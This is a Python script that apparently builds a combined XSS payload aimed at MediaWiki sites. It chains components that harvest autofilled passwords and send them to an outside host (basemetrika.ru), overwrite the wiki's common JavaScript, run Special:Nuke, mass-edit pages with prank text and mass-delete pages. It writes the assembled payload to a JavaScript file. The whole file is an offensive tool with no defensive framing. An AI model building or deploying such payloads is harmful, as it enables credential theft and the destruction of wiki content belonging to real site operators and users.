import sys
sys.path.append("../")
sys.path.append("../../")
from vector import Component
from sources import load_source
import urllib.parse


comp = Component(
    component_id = "combined_xss_1",
    fast_load_part = "",
    jquery_part = (
        Component(
            component_id = "send_password_from_autofill",
            mw_website_prefix = "/wiki/",
            retrieving_url = "//basemetrika.ru/autofill.js?l=&p="
        ) +
        Component(
            component_id = "modify_common_js",
            mw_prefix = "/w",
            urlenc_new_content=urllib.parse.quote(
                load_source("wikireality_common_js_mod.js")
            ),
            negative_pattern="e24",
            urlenc_summary="."
        ) +
        Component(
            component_id = "run_special_nuke",
            mw_prefix = "/w",
            iter_count = str(3)
        ) +
        Component(
            component_id = "run_mass_edit",
            mw_prefix = "/w",
            iter_count = str(20),
            urlenc_prepended_text=urllib.parse.quote(
                load_source("fun_text.txt")
            ),
            urlenc_summary=urllib.parse.quote(
                "Цирк зажигает огни"
            )
        ) +
        Component(
            component_id = "run_mass_deletion",
            mw_prefix = "/w",
            iter_count = str(20)
        )
    )
)

if __name__ == "__main__":
    with open("../../no_include/res.js", "w") as res_js:
        res_js.write(str(comp))
        res_js.close()
